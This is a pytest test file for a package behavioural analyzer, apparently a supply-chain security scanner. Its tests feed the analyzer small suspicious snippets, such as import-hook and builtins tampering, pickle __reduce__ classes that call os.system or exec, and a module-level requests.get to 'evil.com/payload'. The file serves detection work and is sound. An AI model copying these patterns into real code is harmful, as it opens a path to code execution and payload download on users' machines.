"""Unit tests for behavioral analyzer."""
import pytest
import tempfile
import ast
from pathlib import Path
from app.analyzers.behavioral import BehavioralAnalyzer
from app.analyzers.base import SeverityLevel


@pytest.mark.unit
@pytest.mark.asyncio
class TestBehavioralAnalyzer:
    """Tests for BehavioralAnalyzer."""

    @pytest.fixture
    def analyzer(self):
        """Create analyzer instance."""
        return BehavioralAnalyzer()

    @pytest.fixture
    def sample_metadata(self):
        """Sample package metadata."""
        return {
            "name": "test-package",
            "version": "1.0.0",
        }

    @pytest.fixture
    def temp_package_dir(self):
        """Create a temporary package directory."""
        with tempfile.TemporaryDirectory() as tmpdir:
            yield tmpdir

    async def test_analyze_no_extracted_path(self, analyzer, sample_metadata):
        """Test analysis when source code is not available."""
        result = await analyzer.analyze(
            "test-package",
            "1.0.0",
            sample_metadata,
            extracted_path=None
        )

        assert result.category == "behavioral"
        assert len(result.findings) == 0
        assert "error" in result.metadata

    async def test_detect_meta_path_hook(self, analyzer, temp_package_dir):
        """Test detection of sys.meta_path import hook."""
        code = """
import sys
sys.meta_path.append(CustomImporter())
"""
        test_file = Path(temp_package_dir, "test.py")
        test_file.write_text(code)

        findings = await analyzer._analyze_file(str(test_file), temp_package_dir)

        meta_path_findings = [f for f in findings if "meta_path" in f.title.lower()]
        assert len(meta_path_findings) > 0
        assert any(f.severity == SeverityLevel.CRITICAL for f in meta_path_findings)

    async def test_detect_path_hooks(self, analyzer, temp_package_dir):
        """Test detection of sys.path_hooks manipulation."""
        code = """
import sys
sys.path_hooks.insert(0, custom_hook)
"""
        test_file = Path(temp_package_dir, "test.py")
        test_file.write_text(code)

        findings = await analyzer._analyze_file(str(test_file), temp_package_dir)

        path_hooks_findings = [f for f in findings if "path_hooks" in f.title.lower()]
        assert len(path_hooks_findings) > 0
        assert any(f.severity == SeverityLevel.CRITICAL for f in path_hooks_findings)

    async def test_detect_sys_modules_injection(self, analyzer, temp_package_dir):
        """Test detection of sys.modules manipulation."""
        code = """
import sys
sys.modules['fake_module'] = MaliciousModule()
"""
        test_file = Path(temp_package_dir, "test.py")
        test_file.write_text(code)

        findings = await analyzer._analyze_file(str(test_file), temp_package_dir)

        modules_findings = [f for f in findings if "sys.modules" in f.title.lower()]
        assert len(modules_findings) > 0
        assert any(f.severity == SeverityLevel.HIGH for f in modules_findings)

    async def test_detect_builtins_modification(self, analyzer, temp_package_dir):
        """Test detection of __builtins__ modification."""
        code = """
__builtins__['open'] = malicious_open
"""
        test_file = Path(temp_package_dir, "test.py")
        test_file.write_text(code)

        findings = await analyzer._analyze_file(str(test_file), temp_package_dir)

        builtins_findings = [f for f in findings if "builtins" in f.title.lower()]
        assert len(builtins_findings) > 0
        assert any(f.severity == SeverityLevel.CRITICAL for f in builtins_findings)

    async def test_detect_builtins_override(self, analyzer, temp_package_dir):
        """Test detection of builtins override."""
        code = """
import builtins
builtins.open = custom_open
"""
        test_file = Path(temp_package_dir, "test.py")
        test_file.write_text(code)

        findings = await analyzer._analyze_file(str(test_file), temp_package_dir)

        override_findings = [f for f in findings if "builtins" in f.title.lower()]
        assert len(override_findings) > 0
        assert any(f.severity == SeverityLevel.CRITICAL for f in override_findings)

    async def test_detect_code_object_access(self, analyzer, temp_package_dir):
        """Test detection of code object manipulation."""
        code = """
def func():
    pass

bytecode = func.__code__.co_code
"""
        test_file = Path(temp_package_dir, "test.py")
        test_file.write_text(code)

        findings = await analyzer._analyze_file(str(test_file), temp_package_dir)

        code_obj_findings = [f for f in findings if "code object" in f.title.lower()]
        assert len(code_obj_findings) > 0
        assert any(f.severity == SeverityLevel.HIGH for f in code_obj_findings)

    async def test_detect_frame_access(self, analyzer, temp_package_dir):
        """Test detection of sys._getframe usage."""
        code = """
import sys
frame = sys._getframe(1)
"""
        test_file = Path(temp_package_dir, "test.py")
        test_file.write_text(code)

        findings = await analyzer._analyze_file(str(test_file), temp_package_dir)

        frame_findings = [f for f in findings if "frame" in f.title.lower()]
        assert len(frame_findings) > 0
        assert any(f.severity == SeverityLevel.MEDIUM for f in frame_findings)

    async def test_detect_atexit_handler(self, analyzer, temp_package_dir):
        """Test detection of atexit.register usage."""
        code = """
import atexit
atexit.register(cleanup_function)
"""
        test_file = Path(temp_package_dir, "test.py")
        test_file.write_text(code)

        findings = await analyzer._analyze_file(str(test_file), temp_package_dir)

        exit_findings = [f for f in findings if "exit handler" in f.title.lower()]
        assert len(exit_findings) > 0
        assert any(f.severity == SeverityLevel.MEDIUM for f in exit_findings)

    async def test_detect_thread_spawn(self, analyzer, temp_package_dir):
        """Test detection of background thread spawning."""
        code = """
import threading
threading.Thread(target=background_task).start()
"""
        test_file = Path(temp_package_dir, "test.py")
        test_file.write_text(code)

        findings = await analyzer._analyze_file(str(test_file), temp_package_dir)

        thread_findings = [f for f in findings if "thread" in f.title.lower()]
        assert len(thread_findings) > 0
        assert any(f.severity == SeverityLevel.MEDIUM for f in thread_findings)

    async def test_detect_process_spawn(self, analyzer, temp_package_dir):
        """Test detection of background process spawning."""
        code = """
import multiprocessing
multiprocessing.Process(target=worker).start()
"""
        test_file = Path(temp_package_dir, "test.py")
        test_file.write_text(code)

        findings = await analyzer._analyze_file(str(test_file), temp_package_dir)

        process_findings = [f for f in findings if "process" in f.title.lower()]
        assert len(process_findings) > 0
        assert any(f.severity == SeverityLevel.HIGH for f in process_findings)

    async def test_detect_signal_handler(self, analyzer, temp_package_dir):
        """Test detection of signal handler installation."""
        code = """
import signal
signal.signal(signal.SIGTERM, handler)
"""
        test_file = Path(temp_package_dir, "test.py")
        test_file.write_text(code)

        findings = await analyzer._analyze_file(str(test_file), temp_package_dir)

        signal_findings = [f for f in findings if "signal" in f.title.lower()]
        assert len(signal_findings) > 0
        assert any(f.severity == SeverityLevel.MEDIUM for f in signal_findings)

    async def test_detect_ctypes_cdll(self, analyzer, temp_package_dir):
        """Test detection of native library loading via ctypes."""
        code = """
import ctypes
lib = ctypes.CDLL("libc.so.6")
"""
        test_file = Path(temp_package_dir, "test.py")
        test_file.write_text(code)

        findings = await analyzer._analyze_file(str(test_file), temp_package_dir)

        ctypes_findings = [f for f in findings if "native library" in f.title.lower()]
        assert len(ctypes_findings) > 0
        assert any(f.severity == SeverityLevel.MEDIUM for f in ctypes_findings)

    async def test_detect_python_api_access(self, analyzer, temp_package_dir):
        """Test detection of Python C API access via ctypes."""
        code = """
import ctypes
api = ctypes.pythonapi
"""
        test_file = Path(temp_package_dir, "test.py")
        test_file.write_text(code)

        findings = await analyzer._analyze_file(str(test_file), temp_package_dir)

        api_findings = [f for f in findings if "python" in f.title.lower() and "api" in f.title.lower()]
        assert len(api_findings) > 0
        assert any(f.severity == SeverityLevel.HIGH for f in api_findings)

    async def test_detect_pickle_reduce(self, analyzer, temp_package_dir):
        """Test detection of __reduce__ method for pickle exploitation."""
        code = """
class Exploit:
    def __reduce__(self):
        import os
        return (os.system, ('evil command',))
"""
        test_file = Path(temp_package_dir, "test.py")
        test_file.write_text(code)

        findings = await analyzer._analyze_file(str(test_file), temp_package_dir)

        pickle_findings = [f for f in findings if "pickle" in f.title.lower() or "__reduce__" in f.title.lower()]
        assert len(pickle_findings) > 0
        assert any(f.severity == SeverityLevel.HIGH for f in pickle_findings)

    async def test_detect_pickle_reduce_ex(self, analyzer, temp_package_dir):
        """Test detection of __reduce_ex__ method."""
        code = """
class Exploit:
    def __reduce_ex__(self, protocol):
        return (exec, ('malicious code',))
"""
        test_file = Path(temp_package_dir, "test.py")
        test_file.write_text(code)

        findings = await analyzer._analyze_file(str(test_file), temp_package_dir)

        pickle_findings = [f for f in findings if "pickle" in f.title.lower() or "__reduce_ex__" in f.title.lower()]
        assert len(pickle_findings) > 0
        assert any(f.severity == SeverityLevel.HIGH for f in pickle_findings)

    async def test_detect_monkey_patching(self, analyzer, temp_package_dir):
        """Test detection of monkey patching with lambda."""
        code = """
import requests
requests.get = lambda *args, **kwargs: malicious_response()
"""
        test_file = Path(temp_package_dir, "test.py")
        test_file.write_text(code)

        findings = await analyzer._analyze_file(str(test_file), temp_package_dir)

        monkey_patch_findings = [f for f in findings if "monkey" in f.title.lower() or "patch" in f.title.lower()]
        assert len(monkey_patch_findings) > 0
        assert any(f.severity == SeverityLevel.MEDIUM for f in monkey_patch_findings)

    async def test_detect_gc_disable(self, analyzer, temp_package_dir):
        """Test detection of garbage collector manipulation."""
        code = """
import gc
gc.disable()
"""
        test_file = Path(temp_package_dir, "test.py")
        test_file.write_text(code)

        findings = await analyzer._analyze_file(str(test_file), temp_package_dir)

        gc_findings = [f for f in findings if "garbage collector" in f.title.lower()]
        assert len(gc_findings) > 0
        assert any(f.severity == SeverityLevel.MEDIUM for f in gc_findings)

    async def test_detect_audit_hook(self, analyzer, temp_package_dir):
        """Test detection of audit hook installation."""
        code = """
import sys
sys.addaudithook(my_audit_handler)
"""
        test_file = Path(temp_package_dir, "test.py")
        test_file.write_text(code)

        findings = await analyzer._analyze_file(str(test_file), temp_package_dir)

        audit_findings = [f for f in findings if "audit" in f.title.lower()]
        assert len(audit_findings) > 0
        assert any(f.severity == SeverityLevel.MEDIUM for f in audit_findings)

    async def test_module_level_eval(self, analyzer, temp_package_dir):
        """Test detection of eval at module level."""
        code = """
eval("print('malicious')")
"""
        test_file = Path(temp_package_dir, "test.py")
        test_file.write_text(code)

        findings = await analyzer._analyze_file(str(test_file), temp_package_dir)

        eval_findings = [f for f in findings if "eval" in f.title.lower() and "module" in f.title.lower()]
        assert len(eval_findings) > 0
        assert any(f.severity == SeverityLevel.CRITICAL for f in eval_findings)

    async def test_module_level_exec(self, analyzer, temp_package_dir):
        """Test detection of exec at module level."""
        code = """
exec("import os; os.system('evil')")
"""
        test_file = Path(temp_package_dir, "test.py")
        test_file.write_text(code)

        findings = await analyzer._analyze_file(str(test_file), temp_package_dir)

        exec_findings = [f for f in findings if "exec" in f.title.lower() and "module" in f.title.lower()]
        assert len(exec_findings) > 0
        assert any(f.severity == SeverityLevel.CRITICAL for f in exec_findings)

    async def test_module_level_network_call(self, analyzer, temp_package_dir):
        """Test detection of network calls at module level."""
        code = """
import requests
requests.get("https://evil.com/payload")
"""
        test_file = Path(temp_package_dir, "test.py")
        test_file.write_text(code)

        findings = await analyzer._analyze_file(str(test_file), temp_package_dir)

        network_findings = [f for f in findings if "requests.get" in f.title.lower() or "module-level" in f.title.lower()]
        assert len(network_findings) > 0
        assert any(f.severity == SeverityLevel.HIGH for f in network_findings)

    async def test_module_level_subprocess(self, analyzer, temp_package_dir):
        """Test detection of subprocess at module level."""
        code = """
import subprocess
subprocess.run(['ls', '-la'])
"""
        test_file = Path(temp_package_dir, "test.py")
        test_file.write_text(code)

        findings = await analyzer._analyze_file(str(test_file), temp_package_dir)

        subprocess_findings = [f for f in findings if "subprocess" in f.title.lower() and "module" in f.title.lower()]
        assert len(subprocess_findings) > 0
        assert any(f.severity == SeverityLevel.HIGH for f in subprocess_findings)

    async def test_severity_escalation_in_init(self, analyzer, temp_package_dir):
        """Test that severity is escalated in __init__.py files."""
        code = """
import threading
threading.Thread(target=task).start()
"""
        init_file = Path(temp_package_dir, "__init__.py")
        init_file.write_text(code)

        findings = await analyzer._analyze_file(str(init_file), temp_package_dir)

        thread_findings = [f for f in findings if "thread" in f.title.lower()]
        assert len(thread_findings) > 0
        # Should be escalated to HIGH in __init__.py
        assert any(f.severity == SeverityLevel.HIGH for f in thread_findings)
        assert any(f.metadata.get("in_init") is True for f in thread_findings)

    async def test_get_call_name_simple(self, analyzer):
        """Test getting simple function call name."""
        code = "func()"
        tree = ast.parse(code)
        call_node = tree.body[0].value

        name = analyzer._get_call_name(call_node)
        assert name == "func"

    async def test_get_call_name_attribute_chain(self, analyzer):
        """Test getting full attribute chain from call."""
        code = "module.submodule.func()"
        tree = ast.parse(code)
        call_node = tree.body[0].value

        name = analyzer._get_call_name(call_node)
        assert name == "module.submodule.func"

    async def test_find_parent_context_assignment(self, analyzer):
        """Test finding assignment context."""
        code = """
import sys
x = sys.meta_path
"""
        tree = ast.parse(code)
        # Find the sys.meta_path attribute node
        target_node = None
        for node in ast.walk(tree):
            if isinstance(node, ast.Attribute) and node.attr == "meta_path":
                target_node = node
                break

        assert target_node is not None
        context = analyzer._find_parent_context(tree, target_node)
        assert context == "assignment"

    async def test_is_module_level_true(self, analyzer):
        """Test detection of module-level code."""
        code = """
eval('test')
"""
        tree = ast.parse(code)
        call_node = tree.body[0].value

        result = analyzer._is_module_level(tree, call_node)
        assert result is True

    async def test_is_module_level_false_in_function(self, analyzer):
        """Test that code inside function is not module-level."""
        code = """
def func():
    eval('test')
"""
        tree = ast.parse(code)
        # Find the eval call inside the function
        func_def = tree.body[0]
        call_node = func_def.body[0].value

        result = analyzer._is_module_level(tree, call_node)
        assert result is False

    async def test_find_python_files(self, analyzer, temp_package_dir):
        """Test finding Python files."""
        Path(temp_package_dir, "file1.py").touch()
        Path(temp_package_dir, "file2.py").touch()

        subdir = Path(temp_package_dir, "subdir")
        subdir.mkdir()
        Path(subdir, "file3.py").touch()

        files = analyzer._find_python_files(temp_package_dir)
        assert len(files) == 3

    async def test_analyze_full_package(self, analyzer, temp_package_dir, sample_metadata):
        """Test analyzing complete package."""
        Path(temp_package_dir, "safe.py").write_text("print('hello')")
        Path(temp_package_dir, "suspicious.py").write_text("""
import sys
sys.meta_path.append(hook)
""")
        Path(temp_package_dir, "__init__.py").write_text("""
import threading
threading.Thread(target=task).start()
""")

        result = await analyzer.analyze(
            "test-package",
            "1.0.0",
            sample_metadata,
            extracted_path=temp_package_dir
        )

        assert result.category == "behavioral"
        assert result.metadata["files_analyzed"] == 3
        assert len(result.findings) > 0

    async def test_code_type_creation(self, analyzer, temp_package_dir):
        """Test detection of CodeType creation."""
        code = """
import types
code_obj = types.CodeType(1, 0, 0, 0, 0, b'', (), (), (), '', '', 1, b'')
"""
        test_file = Path(temp_package_dir, "test.py")
        test_file.write_text(code)

        findings = await analyzer._analyze_file(str(test_file), temp_package_dir)

        code_type_findings = [f for f in findings if "codetype" in f.title.lower()]
        assert len(code_type_findings) > 0
        assert any(f.severity == SeverityLevel.HIGH for f in code_type_findings)

    async def test_inspect_currentframe(self, analyzer, temp_package_dir):
        """Test detection of inspect.currentframe usage."""
        code = """
import inspect
frame = inspect.currentframe()
"""
        test_file = Path(temp_package_dir, "test.py")
        test_file.write_text(code)

        findings = await analyzer._analyze_file(str(test_file), temp_package_dir)

        frame_findings = [f for f in findings if "frame" in f.title.lower()]
        assert len(frame_findings) > 0
        assert any(f.severity == SeverityLevel.LOW for f in frame_findings)

    async def test_importlib_machinery(self, analyzer, temp_package_dir):
        """Test detection of importlib.machinery access."""
        code = """
import importlib.machinery
loader = importlib.machinery.SourceFileLoader('module', 'path')
"""
        test_file = Path(temp_package_dir, "test.py")
        test_file.write_text(code)

        findings = await analyzer._analyze_file(str(test_file), temp_package_dir)

        import_machinery_findings = [f for f in findings if "import machinery" in f.title.lower()]
        assert len(import_machinery_findings) > 0
        assert any(f.severity == SeverityLevel.MEDIUM for f in import_machinery_findings)

    async def test_syntax_error_handling(self, analyzer, temp_package_dir):
        """Test that syntax errors don't crash analysis."""
        code = """
def broken(
    # Missing closing parenthesis
"""
        test_file = Path(temp_package_dir, "broken.py")
        test_file.write_text(code)

        # Should not raise exception
        findings = await analyzer._analyze_file(str(test_file), temp_package_dir)
        assert isinstance(findings, list)

    async def test_multiple_patterns_one_file(self, analyzer, temp_package_dir):
        """Test detecting multiple behavioral issues in one file."""
        code = """
import sys
import atexit
import threading

sys.meta_path.append(hook)
atexit.register(cleanup)
threading.Thread(target=task).start()
eval("malicious")
"""
        test_file = Path(temp_package_dir, "multi.py")
        test_file.write_text(code)

        findings = await analyzer._analyze_file(str(test_file), temp_package_dir)

        assert len(findings) >= 4
        assert any("meta_path" in f.title.lower() for f in findings)
        assert any("exit" in f.title.lower() or "atexit" in f.title.lower() for f in findings)
        assert any("thread" in f.title.lower() for f in findings)
        assert any("eval" in f.title.lower() for f in findings)

    async def test_module_level_os_system(self, analyzer, temp_package_dir):
        """Test detection of os.system at module level."""
        code = """
import os
os.system('ls -la')
"""
        test_file = Path(temp_package_dir, "test.py")
        test_file.write_text(code)

        findings = await analyzer._analyze_file(str(test_file), temp_package_dir)

        os_findings = [f for f in findings if "os.system" in f.title.lower()]
        assert len(os_findings) > 0
        assert any(f.severity == SeverityLevel.HIGH for f in os_findings)

    async def test_assignment_context_escalation(self, analyzer, temp_package_dir):
        """Test that assignment to dangerous attributes escalates severity."""
        code = """
import sys
sys.modules['fake'] = malicious_module
"""
        test_file = Path(temp_package_dir, "test.py")
        test_file.write_text(code)

        findings = await analyzer._analyze_file(str(test_file), temp_package_dir)

        modules_findings = [f for f in findings if "sys.modules" in f.title.lower()]
        assert len(modules_findings) > 0
        # Should be CRITICAL when used in assignment
        assert any(f.severity == SeverityLevel.CRITICAL for f in modules_findings)
        assert any(f.metadata.get("context") == "assignment" for f in modules_findings)
